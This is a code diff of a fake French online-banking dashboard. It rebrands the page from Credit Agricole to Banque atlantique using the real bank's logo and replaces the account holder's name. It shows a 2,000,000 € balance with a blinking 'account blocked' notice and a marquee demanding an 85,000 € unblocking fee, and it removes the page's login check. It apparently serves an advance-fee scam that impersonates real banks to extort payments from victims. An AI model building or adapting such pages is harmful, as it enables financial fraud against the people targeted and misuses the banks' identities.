@@ -1,14 +1,7 @@
-<?php
-session_start();
-if(@$_SESSION["autoriser"]!="oui"){
-header("location:index.php");
-exit();
-}
-?>
 <!DOCTYPE html>
 <html>
 	<head>
-		<title>Credit Agricole</title>
+		<title>Banque atlantique</title>
 		
 		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
 
@@ -17,7 +10,7 @@ exit();
 		
 		<script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
 
-<script src='https://kit.fontawesome.com/a076d05399.js' crossorigin='anonymous'></script>
+<script src='https://kit.fontawesome.com/618007f65e.js' crossorigin='anonymous'></script>
 
 <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
 
@@ -34,28 +27,28 @@ exit();
   <a href="javascript:void(0)" class="closebtn" onclick="closeNav()" style="color:#fff;text-align:center;top: -10px;">&times;</a>
 
 <div class="profil">
-<img src="https://i.ibb.co/tMz2vrp/AA675390-8500-468-A-9-F3-C-E781-BCE4-A182-removebg-preview.png"/>
+<img src="https://upload.wikimedia.org/wikipedia/commons/5/54/Logo-banque-atlantique.png"/>
 </div>
 <br />
 <section>
-<p>William Kalubi</p>
+<p>Paquet Louane</p>
  <a style="padding:0;margin:0;text-decoration:none;" href="Deco.php"><button class="logout">SE DÉCONNECTER</button></a>
 </section>
   <br />
-  <a href="#">Ma banque et moi</a>
+  <a onclick="alert()" href="#">Ma banque et moi</a>
   <hr style="background-color:#1f94a6">
-  <a href="#">Mes infos personnel</a>
+  <a onclick="alert()" href="#">Mes infos personnel</a>
   <hr style="background-color:#1f94a6">
-  <a href="#">Mes parametre</a>
+  <a onclick="alert()" href="#">Mes paramètres</a>
   <hr style="background-color:#1f94a6">
-  <a href="#">Mes projets</a>
+  <a onclick="alert()" href="#">Mes projets</a>
   <hr style="background-color:#1f94a6">
   <a onclick="alert()" href="#">Mes avantages</a><hr style="background-color:#1f94a6">
  
 </div>
  
 <nav class="topnav">
-  <a href="" onclick="openNav()">
+  <a href="#" onclick="openNav()">
 	<svg width="30" height="30" id="icoOpen">
 		<path d="M0,5 30,5" stroke="#000" stroke-width="2"/>
 		<path d="M0,14 30,14" stroke="#000" stroke-width="2"/>
@@ -63,7 +56,7 @@ exit();
 	</svg>
   </a>
   
-  <img src="https://i.ibb.co/tMz2vrp/AA675390-8500-468-A-9-F3-C-E781-BCE4-A182-removebg-preview.png"/>
+  <img src="https://upload.wikimedia.org/wikipedia/commons/5/54/Logo-banque-atlantique.png"/>
   
   
 </nav>
@@ -83,7 +76,7 @@ function closeNav() {
 <br />
 <br />
 <p style="font-family:sans-serif;font-weight:700;padding:5px;">Bonjour</p>
-<p style="font-family:sans-serif;font-weight:700;padding:5px;line-height:1px;">MR WILLIAM KALUBI</p>
+<p style="font-family:sans-serif;font-weight:700;padding:5px;line-height:1px;">Mlle Paquet Louane</p>
 
 <p style="color:gray;font-family:arial;padding:5px">derniere connexion au <b class="date" style="font-family:sans-serif;font-size:10px;color:gray;"></b></p>
 
@@ -95,12 +88,19 @@ function closeNav() {
 
 <div class="left">
 
-<p>M WILLIAM KALUBI</p>
+<p>Mlle PAQUET LOUANE</p>
 <sub><p>COMPTE DE DEPOT N°627828</p></sub>
 
 
 
-<p style="font-size:30px;"><span style=";font-size:40px;padding:10px" class="material-icons-outlined">light_mode</span><!-- <i class="fa fa-sun-o" style="font-size:30px;color:#fff"></i> -->10.278 €</p>
+<p style="font-size:30px;"><span style=";font-size:40px;padding:10px" class="material-icons-outlined">light_mode</span><!-- <i class="fa fa-sun-o" style="font-size:30px;color:#fff"></i> -->2.000.000,00€</p>
+
+<p class="blink">
+	Votre Compte Est Bloquée
+	</p>
+	
+	<marquee><p style="font-size:15px;colle:#fff">Frais de deblocage: <b style="color:red;">85.000,00€</b></p></marquee>
+	
 
 </div>
 
@@ -150,7 +150,7 @@ function closeNav() {
 
 <div class="livret">
 
-<p style="color:#347780;font-weight:900">M WILLIAM KALUBI</p>
+<p style="color:#347780;font-weight:900">Mlle PAQUET LOUANE</p>
 <!--<i class="fa fa-sun-o" style="font-size:30px;color:yellow;width:10%"></i>-->
 
 <p class="6"><b>Livret A </b style="color:gray;">n°72836273838</p>
@@ -210,7 +210,7 @@ function closeNav() {
 	<ul class="navbar-nav mr-auto">
 	
 	  <li class="nav-item active">
-		<a class="nav-link" href="#"><p style="color:#347780">M WILLIAM KALUBI</p><p style="color:#ffffff;font-weight:400;">INITIAL VALEUR PREVOYANCE</p><p style="color:#ffffff;font-weight:400;">Capital garanti : 8000€</p><span class="sr-only">(current)</span></a>
+		<a class="nav-link" href="#"><p style="color:#347780">Mlle PAQUET LOUANE</p><p style="color:#ffffff;font-weight:400;">INITIAL VALEUR PREVOYANCE</p><p style="color:#ffffff;font-weight:400;">Capital garanti : 8000€</p><span class="sr-only">(current)</span></a>
 	  </li>
 	  
 	</ul>
@@ -239,9 +239,9 @@ function closeNav() {
 </div>
 
 <div class="agir">
-<img style="width:40%;"src="https://i.ibb.co/5Lb7ZJX/6-D597-B5-B-6-BDB-4-F3-F-B808-0-CC1-DA37-D661-removebg-preview.png"/>
+<img style="width:40%;"src="https://upload.wikimedia.org/wikipedia/commons/5/54/Logo-banque-atlantique.png"/>
 <hr style="background-color:#5c5c66">
-<p>LE CREDIT AGRICOLE</p><hr style="background-color:#5c5c66">
+<p>Banque atlantique</p><hr style="background-color:#5c5c66">
 <p>RELATION BANQUE CLIENT</p><hr style="background-color:#5c5c66">
 <p>SITES SPECIALISES</p><hr style="background-color:#5c5c66">
 <p>Accessibilité numerique du site</p><hr style="background-color:#5c5c66">
